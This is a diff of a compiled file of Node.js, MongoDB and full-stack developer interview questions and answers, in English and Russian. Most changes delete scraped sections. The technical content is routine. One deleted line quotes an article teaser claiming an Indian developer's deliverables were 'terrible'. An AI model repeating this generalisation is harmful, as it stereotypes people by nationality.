-Standard Library and Packages: Familiarity with the language's standard library and commonly used packages, covering basic to advanced functionality.
-Practical Experience: Building and contributing to projects, solving real-world problems, and showcasing hands-on experience with the language.
-Testing and Debugging: Writing unit, integration, and performance tests, and using debugging tools and techniques specific to the language.
-Practical experience is invaluable when preparing for a technical interview. Building and contributing to projects, whether personal, open-source, or professional, helps solidify your understanding and showcases your ability to apply theoretical knowledge to real-world problems. Additionally, demonstrating your ability to effectively test and debug your applications can highlight your commitment to code quality and robustness.
-
-Top 24 Node.js Interview Questions with Answers for 1 to 2 Years Experienced Web Developers
-Hello guys, if you are preparing for a JavaScript developer or web developer and looking for common Node.js questions to prepare for interviews then you are at right place. In the past, I have shared JavaScript interview questions, React Questions, Angular Questions and even web development questions and in this article, I am going to share frequently asked Node.js questions with answers for interviews.  Though Node.js is defined as a JavaScript environment, it is widely considered as a backend framework. Since its inception in 2008, Node.js has become a popular term in the server-side development community. More and more companies are using Node.js for backend development.
-
-There are several reasons for choosing Node.js. It is comparatively easier to use because JavaScript is used in Node. Moreover, it uses an event-driven and asynchronous model that enhances the performance.
-
-Today, Node.js has a huge job market. It is giving tough competition to other popular backend frameworks such as Spring Framework, while it is replacing older frameworks such as PHP. Moreover, it is believed that Node.js will dominate server-side development in the future. Node developers are paid very well too.
-
-The average salary of a Node developer in the USA is 113K per year, which definitely makes learning Node.js worthy of your time and effort. Though, more often than note, learning Node.js will help you to become a better Java developer and also enhance your profile as fullstack JavaScript developer. 
-
-
-
-
-20+ Node.js Interview Questions with Answers
-Node.js interviews can be tough. So we have created a list of 20+ Node.js interview questions that will help you in clearing an interview. We have added the questions that are commonly asked in Node.js interviews.
 
 
 1. Define Node.js?
@@ -11821,133 +9639,6 @@ A: Several kinds of applications can be built using Node.js. It is used heavily 
 
 
 That's all about common Node.js interview questions with Answers for 1 to 2 years experienced we, developers. Node.js alone is not a huge topic for interviews. It is mostly combined with Express or MongoDB, or even with frontend technologies like React and Angular. In this article, we listed 20+ Node interview questions which include the combined question with express as well as MongoDB. To prepare without exception, also go through JavaScript because modern JavaScript features are often asked in Node.js interviews.
-
-MangoDB Interview Questions
-
-25 MongoDB Interview Questions and Answers (2023)
-An overview of questions commonly asked in an interview for a position involving MongoDB, the popular open-source database system. Topics include database structure, scalability, performance, and security.
-Apr 14, 2023 - 14:180
- Facebook  Twitter      
-25 MongoDB Interview Questions and Answers (2023)25 MongoDB Interview Questions and Answers (2023)
-
-
-
-What is MongoDB?
-MongoDB is a popular NoSQL database management system that stores data in a flexible, JSON-like format called BSON. It is known for its high performance, scalability, and flexibility, making it ideal for handling large-scale, unstructured data.
-
-What are the key features of MongoDB?
-MongoDB has several key features, including:
-
-Document-based storage: MongoDB stores data in flexible, JSON-like documents.
-Scalability: MongoDB is horizontally scalable, allowing it to handle large amounts of data and high traffic loads.
-High availability: MongoDB supports replica sets and automatic failover for ensuring high availability and data durability.
-Flexible data modeling: MongoDB allows for dynamic schema changes, making it easy to store and query data with varying structures.
-Rich query language: MongoDB supports a powerful query language with features such as aggregation, indexing, and full-text search.
-What is BSON?
-BSON stands for Binary JSON, and it is a binary-encoded serialization format used by MongoDB to store data in a compact, efficient binary format. BSON is similar to JSON in terms of data types and structure, but it provides additional data types such as binary data, date, and ObjectId.
-
-What is a replica set in MongoDB?
-A replica set in MongoDB is a group of MongoDB servers that work together to provide high availability and data redundancy. It consists of a primary node that handles all write operations and one or more secondary nodes that replicate data from the primary node. If the primary node fails, one of the secondary nodes is automatically elected as the new primary, ensuring continuous availability of data.
-
-Explain the concept of sharding in MongoDB.
-Sharding is the process of distributing data across multiple MongoDB servers or shards to achieve horizontal scalability. Each shard contains a subset of the data, and the data is distributed based on a shard key. Sharding allows MongoDB to handle large amounts of data and high traffic loads by distributing the data across multiple servers.
-
-What is the difference between a document and a collection in MongoDB?
-In MongoDB, a document is a single record that represents data in a BSON format. It is similar to a row in a traditional relational database. A collection, on the other hand, is a group of related documents stored in MongoDB. It is similar to a table in a relational database.
-
-How does MongoDB handle transactions?
-Starting from MongoDB version 4.0, MongoDB supports multi-document transactions, allowing users to perform multiple operations on multiple documents in a transactional manner. MongoDB uses the two-phase commit (2PC) protocol to ensure the consistency and durability of data during transactions.
-
-What is an index in MongoDB?
-An index in MongoDB is a data structure that allows for efficient and fast retrieval of data based on the values of one or more fields in a collection. Indexes are used to speed up query performance by reducing the amount of data that needs to be scanned and filtered during query execution.
-
-What are the different types of indexes in MongoDB?
-MongoDB supports several types of indexes, including:
-
-Single-field index: Indexes that are created on a single field.
-Compound index: Indexes that are created on multiple fields.
-Multi-key index: Indexes that are created on arrays to index the values of array elements.
-Text index: Indexes that are used for text search operations.
-GeoSpatial index: Indexes that are used for geospatial queries on data with coordinates.
-How can you create an index in MongoDB?
-In MongoDB, you can create an index using the createIndex() method or the ensureIndex() method. For example, to create a single-field index on a field called "name" in a collection called "users", you can use the following syntax:
-
-db.users.createIndex({ name: 1 })
-
-This will create an ascending index on the "name" field in the "users" collection. The number "1" specifies the ascending order, while "-1" specifies descending order.
-
-What is GridFS in MongoDB?
-GridFS is a specification for storing large files, such as images, audio files, and videos, in MongoDB. It uses a combination of two collections: "files" and "chunks". The "files" collection stores metadata about the files, while the "chunks" collection stores the actual binary data of the files in small chunks.
-
-How can you perform aggregation in MongoDB?
-Aggregation in MongoDB is the process of processing and transforming data using various operations such as grouping, filtering, sorting, and calculating aggregate functions. MongoDB provides an aggregation framework that allows you to perform aggregation using the aggregate() method. For example, you can use the following syntax to group documents by a field called "category" and calculate the average of the "price" field:
-
-db.products.aggregate([
-   { $group: { _id: "$category", avgPrice: { $avg: "$price" } } }
-])
-
-This will group documents in the "products" collection by the "category" field and calculate the average of the "price" field for each category.
-
-What is the difference between find() and findOne() in MongoDB?
-find() and findOne() are two methods used to query data in MongoDB. The main difference is that find() returns a cursor, which is a pointer to the result set, while findOne() returns a single document that matches the query criteria.
-
-What is a covered query in MongoDB?
-A covered query in MongoDB is a query where all the fields required by the query are covered by an index. This means that MongoDB can fulfill the query without having to load the actual documents from the collection, resulting in faster query performance.
-
-How can you perform backups and restores in MongoDB?
-MongoDB provides several methods for performing backups and restores, including:
-
-mongodump: A command-line tool that creates a binary dump of the data in a MongoDB database.
-mongorestore: A command-line tool that restores data from a binary dump created by mongodump.
-MongoDB Atlas: A managed MongoDB service that provides automated backups and restores.
-Filesystem snapshots: Backing up the underlying storage system where MongoDB data is stored.
-How can you perform data modeling in MongoDB?
-Data modeling in MongoDB involves designing the structure of documents and collections to efficiently store and query data. Some best practices for data modeling in MongoDB include denormalizing data, embedding related data in the same document, using appropriate data types, and designing indexes based on query patterns and performance requirements.
-
-What is the TTL index in MongoDB?
-The TTL (Time-To-Live) index in MongoDB is a special type of index that allows you to automatically expire documents from a collection after a certain amount of time. This is useful for storing data that has a limited lifespan, such as temporary data or session data. You can create a TTL index by specifying an expiration field and the desired time-to-live in seconds when creating the index.
-
-What is a cursor in MongoDB?
-A cursor in MongoDB is a pointer to the result set of a query. When you perform a query using methods like find(), MongoDB returns a cursor that you can use to iterate over the results or fetch a subset of the results. Cursors are used to efficiently retrieve large result sets and minimize memory usage.
-
-What is the role of the "ObjectId" in MongoDB?
-The "ObjectId" is a built-in data type in MongoDB that is used as the default primary key for documents in a collection. It is a 12-byte value that consists of a timestamp, a unique machine identifier, a process identifier, and a counter. The "ObjectId" is automatically generated by MongoDB when a document is inserted into a collection and can be used to uniquely identify documents within a collection. It is often used as a unique identifier in the "_id" field of MongoDB documents.
-
-What is horizontal scaling in MongoDB?
-Horizontal scaling in MongoDB refers to the ability to distribute data across multiple nodes or servers in a cluster. It allows for increased storage capacity, processing power, and high availability of data. MongoDB achieves horizontal scaling through techniques such as sharding, which partitions data across multiple shards, and replica sets, which maintain multiple copies of data across different nodes.
-
-How can you perform a join in MongoDB?
-MongoDB does not support joins like traditional relational databases. Instead, data can be denormalized by embedding related data within the same document or by using application-level joins. This means that data that would typically be stored in separate tables in a relational database can be stored in a single document or across multiple documents in MongoDB. This approach avoids the need for expensive join operations and can result in faster query performance.
-
-What is the "findAndModify" command in MongoDB?
-The "findAndModify" command in MongoDB is a powerful command that allows you to atomically modify and return a document in a single operation. It can be used to update a document and retrieve the updated document in a single request. The "findAndModify" command takes a query to specify the document to be modified, an update operation to specify the changes to be made, and optional parameters to specify options such as sorting and returning the original document.
-
-What is the role of the "mongod" process in MongoDB?
-The "mongod" process in MongoDB is the primary daemon process that runs the MongoDB server. It is responsible for managing all aspects of the MongoDB server, including handling client connections, processing queries, managing storage, and handling replication and sharding in a distributed environment. The "mongod" process is the core component of the MongoDB server and is responsible for storing and managing the data.
-
-What is the "NoSQL" approach in MongoDB?
-MongoDB is a NoSQL database, which means that it does not follow the traditional relational database model. Instead of using tables with fixed schemas, MongoDB uses flexible, JSON-like documents to store data. This allows for dynamic and schema-less data structures, making it easy to store, retrieve, and update data in a flexible and scalable manner. The NoSQL approach in MongoDB provides greater agility, scalability, and performance for handling large and complex datasets.
-
-How can you secure MongoDB?
-Securing MongoDB involves implementing various security measures to protect the data and ensure the integrity of the system. Some best practices for securing MongoDB include:
-
-Enabling authentication to require username and password for accessing MongoDB.
-Configuring authorization to control access to databases and collections.
-Encrypting data in transit using SSL/TLS.
-Restricting network access through firewalls and network settings.
-Regularly applying patches and updates to MongoDB to address security vulnerabilities.
-Enabling auditing to monitor and track database activity.
-Using role-based access control (RBAC) to restrict permissions based on user roles.
-Properly configuring and securing MongoDB deployment in a production environment.
-
-Node Js Interview Questions
-
-Node Js Coding Questions and Answers
-This article provides Node js coding questions and answers to help you better understand the basics of Node.js development. Get the answers you need to master Node.js coding and take your development skills to the next level.
-Apr 14, 2023 - 14:09Updated: Apr 15, 2023 - 00:280
- Facebook  Twitter      
-Node Js Coding Questions and Answersnode js coding interview questions and answer
-
 
 
 Reverse a string:
@@ -12114,7 +9805,6 @@ The `findMedianSortedArrays` function takes two sorted arrays, `nums1` and `nums
 
 
 
-
 Serialize and deserialize a binary tree:
 Given a binary tree, write functions to serialize and deserialize it in Node.js.
 
@@ -12235,14 +9925,6 @@ The class has two main methods, get and put, which implement the basic operation
 The get method first checks if the key exists in the cache. If it does, it returns the corresponding value and moves the accessed key-value pair to the end of the Map to mark it as the most recently used. If the key does not exist, it returns -1 to indicate that the key is not in the cache.
 The put method first checks if the key already exists in the cache. If it does, it updates the value and moves the key-value pair to the end of the Map to mark it as the most recently used. If the key does not exist and the cache is already at its capacity, it removes the least recently used key-value pair from the beginning of the Map. Finally, it adds the new key-value pair
 
-21 вопрос по Node.js с ответами
-21 вопрос по Node.js с ответами, изображение №1
-Node.js используется не только в серверной части. Он также применяется для создания интерфейсных приложений, и это стало очень важной частью экосистемы веб-разработки. Это означает, что разработчику, использующему Node.js, очень полезно знать роль, которую эта технология играет в различных JavaScript- средах. По этой причине я включил в данное руководство несколько вопросов и ответов в этом направлении.
-
-Общие указания
-Я бы рекомендовал попытаться ответить на вопросы самостоятельно, прежде чем читать ответы.
-
-Вопросы по Node.js
 Что такое Node.js?
 Node.js — это среда выполнения JavaScript, основанная на движке V8. Она позволяет запускать JavaScript вне браузера — обычно на веб-сервере.
 
@@ -12306,19 +9988,6 @@ Web worker реализованы в браузере, а рабочие пот�
 Что бы вы использовали для открытия двустороннего соединения с клиентом через HTTP в реальном времени?
 Мы могли бы использовать WebSockets или длинный поллинг. Существуют библиотеки, такие как soket.io и SignalR, которые упрощают нашу задачу. Они даже предоставляют клиенты, которые возвращаются к длинному поллингу, если WebSockets недоступны в браузере.
 
-Top 80+ NodeJS Interview Questions for Fresher & Senior Developer
- 17 Jul 2025
- Question
- 22.9K Views
- 63 min read
-
-Learn with an interactive course and practical hands-on labs
-Free Node.js Course with Certification for Beginners [2025]
-Going for a Node.js interview can feel exciting but also a little tricky. To do well, you should know the Node.js interview questions that are often asked. You need to understand how Node.js handles tasks, why it is fast, and how it works with JavaScript. Also, be ready for Node.js coding interview questions, where you might have to write simple code.
-
-In this Node.js Tutorial, Interviewers don’t just look for memorized answers. They want to see if you truly understand the topic. That’s why practicing Node.js interview questions and going through Node.js interview questions and answers will help. With good preparation, you can feel confident and increase your chances of getting the job!
-
-Top Node.js Interview Questions and Answers for Beginners
 1. What is Node.js?
 Node.js is a server-side JavaScript environment for developing web applications like ASP.NET, JSP, PHP, etc. It is an open-source and cross-platform framework based on Google's V8 JavaScript Engine.
 
@@ -12975,8 +10644,6 @@ Node.js работает в среде v8, это виртуальная маш�
 3) Что вы подразумеваете под термином ввод-вывод?
 Ввод-вывод — это сокращение ввода и вывода, и он будет иметь доступ ко всему, что находится за пределами вашего приложения. Он будет загружен в память машины для запуска программы после запуска приложения.
 
-Node.js
-
 4) Что означает программирование, управляемое событиями?
 В компьютерном программировании событийно-ориентированное программирование — это парадигма программирования, в которой ход выполнения программы определяется событиями, такими как сообщения от других программ или потоков. Это метод архитектуры приложения, разделенный на два раздела: 1) Выбор событий 2) Обработка событий.
 
@@ -13009,12 +10676,6 @@ Syncхронические, блокирующие функции
 10) Почему Node.js однопоточный?
 Для асинхронной обработки Node.js был создан явно в качестве эксперимента. Считается, что большей производительности и масштабируемости можно достичь, выполняя асинхронную обработку в одном потоке при типичных веб-загрузках, чем при типичной реализации на основе потоков.
 
-СТАТЬИ ПО ТЕМЕ
-Как загрузить и установить Node.js и NPM на Windows
-Учебное пособие по Node.js для начинающих
-Учебное пособие по GraphQL для начинающих: что такое, возможности и пример
-GraphQL против REST – разница между API
-Вопросы и ответы на собеседовании по Node js для опытных специалистов
 11) Работает ли узел в Windows?
 Да, это так. Загрузите установщик MSI с сайта https://nodejs.org/download/
 
@@ -13074,16 +10735,6 @@ Node.js решает эту проблему, помещая в основу м�
 25) Что такое «обратный вызов» в node.js?
 Функция обратного вызова используется в node.js для обработки нескольких запросов, отправленных на сервер. Например, если у вас есть большой файл, чтение которого серверу займет много времени, и если вы не хотите, чтобы сервер читал этот большой файл во время обработки других запросов, используется функция обратного вызова. Функция обратного вызова позволяет серверу сначала обработать ожидающий запрос и вызвать функцию после его завершения.
 
-Эти вопросы для собеседования также помогут вам в устной речи.
-
-25 Advanced Node.js Backend Interview Questions for Senior Role
-June 16, 2025
-·
-13 min read
-Jump to Category
-⚡ Event Loop & Asynchronous Operations	️ Architecture & Design Patterns
-Performance & Memory Management	️ Security & Error Handling
-Event Loop & Asynchronous Operations
 1. Explain the different phases of the Node.js Event Loop in detail.
 The Node.js event loop consists of several phases that execute in a specific order. The main phases are:
 
@@ -13224,94 +10875,6 @@ Queues: Processing jobs that touch the same resource sequentially through a queu
 
 `npm ci` (“clean install”): Is meant for automated environments like continuous integration (CI) pipelines. It provides faster, more reliable, and deterministic builds. It deletes `node_modules` before starting and installs dependencies exactly as specified in the `package-lock.json` file. It will fail if the lock file is out of sync with `package.json`.
 
-1-hour NodeJS full-stack developer interview questions.
-Follow this script to detect the best NodeJS / React developers in 1 hour.
-
-At code.store we hire the best developers in Eastern Europe countries. I wanted to share with you our NodeJS/Fullstack job interview questions. So you can hire the best too.
-
-Plan
-Duration → 60 minutes minimum (2 hours is better)
-
-What do these 12 programming languages say about you?
-Tell me what your favorite language is, and I’ll tell you who you are.
-medium.com
-
-Phases
-0–5 (10min) → introduction, General Questions
-5–30 (25min) → Tech Knowledge
-30–55 (25min) → Coding question
-55–60 (5min) → Wrap-up
-5 must-haves to get high-quality code with an offshore developer!
-You tried hiring an Indian developer, and received the first deliverables, they were terrible. Sounds familiar? Your…
-medium.com
-
-General
-Introduction. A couple of minutes about what you’re most interested in and excited about.
-Tell me about your previous most exciting task.
-Tell me about a tech project you’ve worked on in your spare time.
-What are the benefits and the drawbacks of working in an Agile environment?
-Did you perform code reviews? How do you approach code reviews and which process do you follow? Please send examples (3–4) of your code review comments.
-Have you ever been assigned a task you were not familiar with? How did you handle it?
-JavaScript, TypeScript:
-What is the difference between == and ===? What to use when?
-Difference between var, let & const? What to use when?
-What is bind, call, apply and what's the difference?
-What is Typescript? Why use it over JavaScript?
-What are Generics?
-How do you use TypeScript on Node.js projects?
-What is the difference between arrow function and normal functions?
-Node
-Are you familiar with child_process module? What is it?
-What is the difference between spawn and exec, forks? What are use cases?
-Is there any reason to use child_process for intensive i/o work?
-Worker threads, cluster module? What are use cases?
-Why are top-level variables not global in modules?
-What are cyclic module dependencies in Node?
-When is it acceptable to use synchronous filesystem methods (like readFileSync)? Why do we use async usually?
-What will the Node app do when the call stack and event loop queues are empty?
-Coding is outdated, learn AI prompts
-Code is only a transient way of communication between humans and machines in computer history, the future of coding is…
-medium.com
-
-Data structures
-Which data structures did you recently use?
-Difference between Array and HashMap (Dictionary)?
-Speed of Insert/Access/Delete operations in Array and HashMap? Provide Big O for those operations.
-MongoDB and Redis:
-Why use MongoDB instead of SQL?
-How do we typically model data in MongoDB? → embedded documents VS different collections, access pattern design, etc
-How to search for complex nested and linked data in MongoDB? Give examples of previous experience with complex aggregates.
-How to debug a slow aggregate in MongoDB?
-What are use cases for Redis?
-Can we expire a record from Redis?
-SQL
-Which SQL database did you use? Which do you prefer and why?
-What is denormalization? When do we need it? What are the normal forms?
-How to query data from two tables in a single query?
-What is the difference between LEFT and RIGHT joins?
-How do we debug a slow SQL query?
-How do we fix a slow SQL query?
-Microservices
-How would you implement transactions in microservices architecture?
-How would you implement communication between microservices?
-How a single developer dropped AWS costs by 90%, then disappeared.
-It’s Christmas and I just finished my last audit of a SaaS client. His story is worth telling. It’s a story about…
-medium.com
-
-React
-What is Virtual DOM?
-Did you work with SSR in React? How does it work?
-What are fragments in React?
-What are the rules of React hooks?
-How to debug react app?
-How can we pass data from one component to other components in React?
-What is the most complex component have you ever made?
-Have you ever used portals, render props, refs other React features?
-CSS, HTML
-What’re the difference between block, inline and inline-block elements?
-How do you write CSS? Using some methodologies like Atomic CSS, or BEM? Or using Styled Components?
-How do you specify units in the CSS? What are the ways to do it?
-What is a CSS preprocessor?
 
 15+ NodeJS interview questions with Answers for 1 to  2 years experience
 Here is a list of frequently asked Node.js questions from interviews for 1 to 2 years of experience as web developers. You can revise these questions before going for a face-to-face interview or before attending any telephonic interview. 
@@ -13319,10 +10882,7 @@ Here is a list of frequently asked Node.js questions from interviews for 1 to 2 
 1. What is Node.js?
 Answer: Node.js is an open-source, runtime JavaScript environment built on Google Chrome's V8 engine.
 
-node.js architecture explained
-
-
- 
+node.js architecture explained 
 
 2. What is Node.js used for?
 Answer: Node.js is used to create complex single-page applications, server-side applications, real-time applications, RESTful APIs, chat rooms, browser games, etc.
@@ -13339,14 +10899,9 @@ Answer: Asynchronous programming is a design pattern in which the code is execut
 5. What is NPM?
 Answer: NPM stands for Node Package Manager. It is a Command Line Interface tool used for downloading and publishing packages. It is an online repository that hosts several JavaScript packages.
 
-
-
- 
-
 6. What is package.json and what is it used for?
 Answer: The package.json file holds several metadata information regarding the project. It includes various fields such as name, description, and dependencies. It is used to give information to the node package manager to identify the project as well as handle the dependencies associated with it.
  
-
 7. Why should we use Node.js?
 Answer: We should use Node.js because:
 It is asynchronous.
@@ -13384,11 +10939,5 @@ Answer: Node.js is single-threaded. Still, it can perform non-blocking operation
 
 node.js event loop
 
-
- 
-
 15. What is an event emitter
 Answer: An event emitter in Node.js is a class that holds all those objects that can emit events.
-
-
-That's all about the frequently asked Node.js interview questions for beginners and people with 1 to 2 years of experience in web development. As mentioned earlier, Node.js is wide and several questions can be taken out of it. In this article, we discussed the 15 commonly asked Node.js questions with answers.
